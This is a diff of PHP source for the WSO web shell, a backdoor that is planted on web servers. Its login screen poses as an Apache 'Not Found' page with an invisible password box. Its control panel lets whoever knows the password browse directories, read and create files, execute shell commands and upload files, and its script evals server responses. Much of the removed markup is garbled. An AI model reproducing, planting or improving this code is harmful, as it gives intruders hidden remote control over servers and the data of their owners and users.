@@ -35,26 +35,17 @@
 	
 	function printLogin() { 
     ?> 
-
-<body>
-    <h1>Not Found</h1>
-
-    <p>The requested URL was not found on this server.</p>
-    <hr>
-
-    <address>
-        Apache Server at <?=$_SERVER['HTTP_HOST']?>
-         Port 80
-    </address><style>
-
+<h1>Not Found</h1> 
+<p>The requested URL was not found on this server.</p> 
+<hr> 
+<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
+    <style> 
         input { margin:0;background-color:#fff;border:1px solid #fff; } 
-    </style>
-
-    <form method="post">
-        <input name="pass" type="password">
-    </form><br>
-</body>
-
+    </style> 
+    <center> 
+    <form method=post> 
+    <input type=password name=pass> 
+    </form></center> 
     <?php 
     exit; 
 } 
@@ -97,39 +88,38 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
 		if(empty($_POST['charset']))        $_POST['charset'] = $GLOBALS['default_charset'];
 		global $color;
 		echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . WSO_VERSION ."</title>
-
-    <style>
+<style>
 body{background-color:#444;color:#e1e1e1;}
-    body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
-    table.info{ color:#fff;background-color:#222; }
-    span,h1,a{ color: $color !important; }
-    span{ font-weight: bolder; }
-    h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
-    div.content{ padding: 5px;margin-left:5px;background-color:#333; }
-    a{ text-decoration:none; }
-    a:hover{ text-decoration:underline; }
-    .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
-    .bigarea{ width:100%;height:300px; }
-    input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
-    form{ margin:0px; }
-    #toolsTbl{ text-align:center; }
-    .toolsInp{ width: 300px }
-    .main th{text-align:left;background-color:#5e5e5e;}
-    .main tr:hover{background-color:#5e5e5e}
-    .l1{background-color:#444}
-    .l2{background-color:#333}
-    pre{font-family:Courier,Monospace;}
-    </style>
-    <script>
-var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
+body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
+table.info{ color:#fff;background-color:#222; }
+span,h1,a{ color: $color !important; }
+span{ font-weight: bolder; }
+h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
+div.content{ padding: 5px;margin-left:5px;background-color:#333; }
+a{ text-decoration:none; }
+a:hover{ text-decoration:underline; }
+.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
+.bigarea{ width:100%;height:300px; }
+input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
+form{ margin:0px; }
+#toolsTbl{ text-align:center; }
+.toolsInp{ width: 300px }
+.main th{text-align:left;background-color:#5e5e5e;}
+.main tr:hover{background-color:#5e5e5e}
+.l1{background-color:#444}
+.l2{background-color:#333}
+pre{font-family:Courier,Monospace;}
+</style>
+<script>
+    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
     var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
     var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
     var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':
-        htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
+		htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
     var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':
-        htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
+		htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
     var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':
-        htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
+		htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
     var d = document;
     function set(a,c,p1,p2,p3,charset) {
         if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
@@ -170,22 +160,16 @@ var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
                 eval(arr[2].substr(0, arr[1]));
             } else alert('Request error!');
     }
-    </script>
-
-    <title></title>
-</head>
-
-<body>
-    <div style=
-    'position:absolute;width:100%;background-color:#444;top:0;left:0;'>
-        <form id="mf" method="post" name="mf" style='display:none;'>
-            <input name="a" type="hidden"> <input name="c" type="hidden">
-            <input name="p1" type="hidden"> <input name="p2" type="hidden">
-            <input name="p3" type="hidden"> <input name="charset" type=
-            "hidden">
-        </form>
-    </div>
-</body>";
+</script>
+<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
+<form method=post name=mf style='display:none;'>
+<input type=hidden name=a>
+<input type=hidden name=c>
+<input type=hidden name=p1>
+<input type=hidden name=p2>
+<input type=hidden name=p3>
+<input type=hidden name=charset>
+</form>";
 		$freeSpace = @diskfreespace($GLOBALS['cwd']);
 		$totalSpace = @disk_total_space($GLOBALS['cwd']);
 		$totalSpace = $totalSpace?$totalSpace:
@@ -247,73 +231,24 @@ var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
 		$is_writable = is_writable($GLOBALS['cwd'])?" <font color=#27ae60>(Writeable)</font>":
 		" <font color=#c0392b>(Not writable)</font>";
 		echo "
-<body>
-    <table cellpadding="3" cellspacing="0" class="info" id="toolsTbl" style=
-    'border-top:2px solid #333;border-bottom:2px solid #333;' width="100%">
-        <tr>
-            <td>
-                <form onsubmit='g(null,this.c.value,\"\");return false;'>
-                    <span>Change dir:</span><br>
-                    <input class='toolsInp' name="c" type="text" value=
-                    '" . htmlspecialchars($GLOBALS['><input type="submit"
-                    value='Go'>
-                </form>
-            </td>
-
-            <td>
-                <form onsubmit=
-                "\&quot;g('FilesTools',null,this.f.value);return">
-                    <span>Read file:</span><br>
-                    <input class='toolsInp' name="f" type="text"><input type=
-                    "submit" value='Go'>
-                </form>
-            </td>
-        </tr>
-
-        <tr>
-            <td>
-                <form onsubmit=
-                "\&quot;g('FilesMan',null,'mkdir',this.d.value);return">
-                    <span>Make dir:</span>$is_writable<br>
-                    <input class='toolsInp' name="d" type="text"><input type=
-                    "submit" value='Go'>
-                </form>
-            </td>
-
-            <td>
-                <form onsubmit=
-                "\&quot;g('FilesTools',null,this.f.value,'mkfile');return">
-                    <span>Make file:</span>$is_writable<br>
-                    <input class='toolsInp' name="f" type="text"><input type=
-                    "submit" value='Go'>
-                </form>
-            </td>
-        </tr>
-
-        <tr>
-            <td>
-                <form onsubmit="\&quot;g('Console',null,this.c.value);return">
-                    <span>Execute:</span><br>
-                    <input class='toolsInp' name="c" type="text" value=
-                    ''><input type="submit" value='Go'>
-                </form>
-            </td>
-
-            <td>
-                <form enctype='multipart/form-data' method='post'>
-                    <input name="a" type="hidden" value='FilesMAn'>
-                    <input name="c" type="hidden" value='" . $GLOBALS['>
-                    <input name="p1" type="hidden" value='uploadFile'>
-                    <input name="charset" type="hidden" value=
-                    '" . (isset($_POST['> <span>Upload
-                    file:</span>$is_writable<br>
-                    <input class='toolsInp' name="f" type="file"><input type=
-                    "submit" value='Go'>
-                </form><br>
-            </td>
-        </tr>
-    </table>
-</body>";
+</div>
+<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
+    <tr>
+        <td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='Go'></form></td>
+        <td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='Go'></form></td>
+    </tr><tr>
+        <td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='Go'></form></td>
+        <td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='Go'></form></td>
+    </tr><tr>
+        <td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='Go'></form></td>
+        <td><form method='post' ENCTYPE='multipart/form-data'>
+        <input type=hidden name=a value='FilesMAn'>
+        <input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
+        <input type=hidden name=p1 value='uploadFile'>
+        <input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:
+		'') . "'>
+        <span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='Go'></form><br  ></td>
+    </tr></table></div></body></html>";
 	}
 
 	
